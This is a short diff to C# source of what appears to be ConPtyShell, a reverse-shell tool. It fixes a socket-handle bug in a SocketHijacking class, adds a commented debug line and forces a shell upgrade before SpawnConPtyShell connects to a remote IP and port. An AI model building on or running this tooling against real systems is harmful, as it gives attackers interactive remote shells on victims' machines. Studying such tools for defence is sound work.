@@ -340,7 +340,7 @@ public static class SocketHijacking{
             CloseHandle(parentSocketHandle);
             return false;
         }
-        if(getpeername(socketHandle, ref sockaddrParentProcess, ref sockaddrParentProcessLen) != 0){
+        if(getpeername(parentSocketHandle, ref sockaddrParentProcess, ref sockaddrParentProcessLen) != 0){
             Console.WriteLine("getpeername sockaddrParentProcess failed with wsalasterror " + WSAGetLastError().ToString());
             CloseHandle(parentSocketHandle);
             return false;
@@ -375,6 +375,7 @@ public static class SocketHijacking{
                 Console.WriteLine("WSASocket failed with error " + WSAGetLastError().ToString());
                 return dupSocketHandle;
             }
+            //Console.WriteLine("WSASocket success handlex 0x" + dupSocketHandle.ToString("X4"));
         }
         return dupSocketHandle;
     }        
@@ -1080,6 +1081,7 @@ Examples:
             uint rows = ParseRows(args);
             uint cols = ParseCols(args);
             string commandLine = ParseCommandLine(args);
+            upgradeShell = true;
             output=ConPtyShell.SpawnConPtyShell(remoteIp, remotePort, rows, cols, commandLine, upgradeShell);
         }
         return output;
